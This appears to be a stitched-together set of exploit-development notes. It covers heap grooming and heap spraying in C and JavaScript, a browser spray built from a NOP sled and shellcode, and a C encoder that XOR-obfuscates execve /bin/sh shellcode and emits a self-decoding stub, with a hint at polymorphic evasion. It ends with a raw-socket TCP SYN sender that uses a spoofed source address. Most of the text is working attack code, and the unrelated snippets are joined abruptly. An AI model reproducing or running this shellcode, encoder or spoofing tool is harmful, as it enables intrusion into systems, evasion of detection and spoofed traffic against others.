Heap grooming (also called heap feng shui / heap shaping) involves making a series of allocations and frees to put the heap into a known state so that the next allocation lands exactly where you want it.

Goals:
  1. Place a controlled allocation adjacent to the victim chunk (for overflow)
  2. Recycle a freed chunk so UAF gives you a useful type's memory
  3. Fill tcache/fastbin with dummy chunks to force a specific bin to be used

Basic grooming loop:
  void *spray[64];
  for (int i = 0; i < 64; i++) spray[i] = malloc(SIZE);  // drain tcache/fastbin
  for (int i = 0; i < 64; i += 2) free(spray[i]);        // create holes
  // Now allocate victim object — lands in one of the holes
  struct Victim *v = malloc(sizeof(*v));

For browser exploitation (e.g. SpiderMonkey):
  // Spray ArrayBuffer of exact object size to fill holes
  var spray = [];
  for (var i = 0; i < 1000; i++) spray.push(new ArrayBuffer(SIZE));
  // Free half to create holes at predictable addresses
  for (var i = 0; i < 1000; i += 2) spray[i] = null;
  gc();   // trigger collection
  // Allocate target object — high probability of landing in controlled memory

Key insight: tcache has 7 slots per size; after 7 frees the 8th goes to fastbin/unsorted. Time allocations to control which bin is served.

A heap spray fills the heap with a large number of identical controlled blocks so that jumping to a guessed address has a high probability of landing inside controlled data (usually a NOP sled + shellcode or ROP chain).

In JavaScript (legacy browser):
  var sc = unescape("%u4141%u4141...shellcode...");
  // pad to 1MB block with NOP sled (0x0c0c0c0c is a common target)
  var nopsled = unescape("%u0c0c%u0c0c");
  while (nopsled.length < 0x80000) nopsled += nopsled;
  var spray = [];
  for (var i = 0; i < 300; i++) spray.push(nopsled + sc);
  // Then trigger vulnerability — EIP will likely land in spray at 0x0c0c0c0c

Modern approach (post-ASLR/sandbox): spray is used differently:
  - ArrayBuffer spray to get many controlled 64-byte regions at predictable glibc bins
  - Typed arrays for precise 8-byte aligned writes
  - Combined with info leak to confirm landing address

In WebAssembly contexts: spray JSObject arrays of known sizes to fill tcache bins, then overflow one object into the next to corrupt a pointer.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

// Original shellcode (execve /bin/sh, null-free)
unsigned char sc[] = {
    0x48,0x31,0xd2,0x48,0xbb,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,
    0x68,0x48,0xc1,0xeb,0x08,0x53,0x48,0x89,0xe7,0x52,0x57,0x48,
    0x89,0xe6,0x6a,0x3b,0x58,0x0f,0x05
};

void encode(unsigned char *out, unsigned char key, size_t len) {
    for (size_t i = 0; i < len; i++) out[i] = sc[i] ^ key;
}

// Self-decoding stub emitted in C (would be ASM in real payload)
void emit_decoder(unsigned char key, unsigned char *encoded, size_t len) {
    printf("// Decoder stub + encoded payload\n");
    printf("unsigned char key = 0x%02x;\n", key);
    printf("unsigned char enc[] = {");
    for (size_t i = 0; i < len; i++) printf("0x%02x%s", encoded[i], i+1<len?",":"");
    printf("};\n");
    printf("void run() {\n");
    printf("  for(int i=0;i<%zu;i++) enc[i]^=key;\n", len);
    printf("  ((void(*)())enc)();\n}\n");
}

int main() {
    srand(time(NULL));
    unsigned char key;
    // Key must not XOR with any byte to produce null
    do { key = rand() & 0xff; } while (key == 0);

    size_t len = sizeof(sc);
    unsigned char encoded[len];
    encode(encoded, key, len);

    emit_decoder(key, encoded, len);
    return 0;
}
// For true polymorphism: change the decoder stub each run (junk instructions,
// register substitution, equivalent instruction sequences).

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

// Pseudo-header for TCP checksum calculation
struct pseudo_header {
    uint32_t src, dst;
    uint8_t  zero, proto;
    uint16_t tcp_len;
};

uint16_t checksum(void *data, int len) {
    uint16_t *ptr = data;
    uint32_t sum = 0;
    for (; len > 1; len -= 2) sum += *ptr++;
    if (len == 1) sum += *(uint8_t*)ptr;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return ~sum;
}

int main() {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) { perror("socket (need CAP_NET_RAW)"); return 1; }

    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    memset(packet, 0, sizeof(packet));

    struct iphdr  *ip  = (struct iphdr*)packet;
    struct tcphdr *tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));

    ip->ihl     = 5; ip->version = 4; ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr   = inet_addr("192.168.1.100");   // spoofed src
    ip->daddr   = inet_addr("10.0.0.1");         // target
    ip->tot_len = htons(sizeof(packet));

    tcp->source = htons(12345);
    tcp->dest   = htons(80);
    tcp->seq    = htonl(0xdeadbeef);
    tcp->doff   = 5;
    tcp->syn    = 1;
    tcp->window = htons(65535);

    // Calculate TCP checksum
    char pseudo[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
    struct pseudo_header *ph = (struct pseudo_header*)pseudo;
    ph->src = ip->saddr; ph->dst = ip->daddr;
    ph->zero = 0; ph->proto = IPPROTO_TCP;
    ph->tcp_len = htons(sizeof(struct tcphdr));
    memcpy(pseudo + sizeof(*ph), tcp, sizeof(struct tcphdr));
    tcp->check = checksum(pseudo, sizeof(pseudo));

    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dst = {.sin_family=AF_INET, .sin_addr.s_addr=ip->daddr};
    sendto(s, packet, sizeof(packet), 0, (struct sockaddr*)&dst, sizeof(dst));
    printf("[+] SYN sent\n");
    close(s);
    return 0;
}
// Run: sudo ./syn_send  (requires CAP_NET_RAW or root)
